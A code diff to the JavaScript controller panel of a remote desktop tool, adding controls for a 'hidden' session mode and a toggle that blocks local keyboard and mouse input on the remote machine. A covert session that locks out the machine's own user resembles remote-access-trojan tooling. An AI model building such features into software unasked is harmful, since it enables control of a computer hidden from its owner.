@@ -249,7 +249,11 @@
     topRegion: document.getElementById("topRegion"),
     topIp: document.getElementById("topIp"),
     topTime: document.getElementById("topTime"),
-    topFlags: document.getElementById("topFlags")
+    topFlags: document.getElementById("topFlags"),
+    // Hidden Desktop Controls
+    hiddenDesktopControls: document.getElementById("hiddenDesktopControls"),
+    inputBlockingToggle: document.getElementById("inputBlockingToggle"),
+    inputBlockingStatus: document.getElementById("inputBlockingStatus")
   };
 
   const KEY_MAP = {
@@ -578,6 +582,10 @@
       remdesk.updateCursorOverlayVisibility();
     }
     updateRemoteCursorVisibilityAvailability();
+    // Update hidden desktop controls visibility
+    if (remdesk.updateHiddenDesktopControls) {
+      remdesk.updateHiddenDesktopControls();
+    }
   }
 
   function applySessionMode(mode, options = {}) {
@@ -676,6 +684,107 @@
       : "Remote cursor hidden";
   }
 
+  // =========================================================================
+  // Hidden Desktop: Input Blocking Controls
+  // =========================================================================
+  
+  /**
+   * Update the input blocking status display.
+   * @param {boolean} isBlocked - Whether input is currently blocked.
+   * @param {string} [statusState] - Status state: "on", "off", or "error".
+   */
+  function setInputBlockingStatus(isBlocked, statusState) {
+    if (!dom.inputBlockingStatus) return;
+    
+    const stateValue = statusState || (isBlocked ? "on" : "off");
+    dom.inputBlockingStatus.setAttribute("data-state", stateValue);
+    
+    if (stateValue === "error") {
+      dom.inputBlockingStatus.textContent = "Input blocking: Error (admin required?)";
+    } else if (isBlocked) {
+      dom.inputBlockingStatus.textContent = "Input blocking: ON (local input disabled)";
+    } else {
+      dom.inputBlockingStatus.textContent = "Input blocking: OFF";
+    }
+    
+    // Sync toggle state
+    if (dom.inputBlockingToggle) {
+      dom.inputBlockingToggle.checked = isBlocked;
+    }
+  }
+  
+  /**
+   * Toggle input blocking on the remote client.
+   * Sends a message over the data channel to enable/disable local input.
+   * @param {boolean} enabled - Whether to enable input blocking.
+   */
+  function toggleInputBlocking(enabled) {
+    if (!state.dataChannel || state.dataChannel.readyState !== "open") {
+      setInputBlockingStatus(false, "error");
+      return;
+    }
+    
+    const message = {
+      action: "toggle_input_blocking",
+      enabled: Boolean(enabled)
+    };
+    
+    try {
+      if (remdesk.sendEncrypted) {
+        remdesk.sendEncrypted(message);
+      } else {
+        state.dataChannel.send(JSON.stringify(message));
+      }
+    } catch (err) {
+      console.error("Failed to toggle input blocking:", err);
+      setInputBlockingStatus(false, "error");
+    }
+  }
+  
+  /**
+   * Handle response from the client about input blocking status.
+   * @param {Object} payload - Response payload from client.
+   */
+  function handleInputBlockingResponse(payload) {
+    const isBlocked = Boolean(payload.is_blocked);
+    const success = payload.success !== false;
+    
+    if (!success) {
+      setInputBlockingStatus(false, "error");
+      return;
+    }
+    
+    setInputBlockingStatus(isBlocked);
+  }
+  
+  /**
+   * Initialize input blocking toggle event listener.
+   */
+  function initInputBlockingToggle() {
+    if (!dom.inputBlockingToggle) return;
+    
+    dom.inputBlockingToggle.addEventListener("change", function() {
+      toggleInputBlocking(this.checked);
+    });
+  }
+  
+  /**
+   * Update hidden desktop controls visibility based on session mode.
+   */
+  function updateHiddenDesktopControls() {
+    const isHiddenMode = state.sessionMode === "hidden";
+    
+    if (dom.hiddenDesktopControls) {
+      dom.hiddenDesktopControls.style.display = isHiddenMode ? "block" : "none";
+    }
+    
+    // Reset input blocking toggle when not in hidden mode
+    if (!isHiddenMode && dom.inputBlockingToggle) {
+      dom.inputBlockingToggle.checked = false;
+      setInputBlockingStatus(false);
+    }
+  }
+
   remdesk.normalizeTopValue = normalizeTopValue;
   remdesk.extractHost = extractHost;
   remdesk.updateTopBar = updateTopBar;
@@ -706,4 +815,10 @@
   remdesk.restorePanelState = restorePanelState;
   remdesk.toggleFullscreen = toggleFullscreen;
   remdesk.updateRemoteCursorVisibilityAvailability = updateRemoteCursorVisibilityAvailability;
+  // Hidden Desktop Controls
+  remdesk.setInputBlockingStatus = setInputBlockingStatus;
+  remdesk.toggleInputBlocking = toggleInputBlocking;
+  remdesk.handleInputBlockingResponse = handleInputBlockingResponse;
+  remdesk.initInputBlockingToggle = initInputBlockingToggle;
+  remdesk.updateHiddenDesktopControls = updateHiddenDesktopControls;
 })();
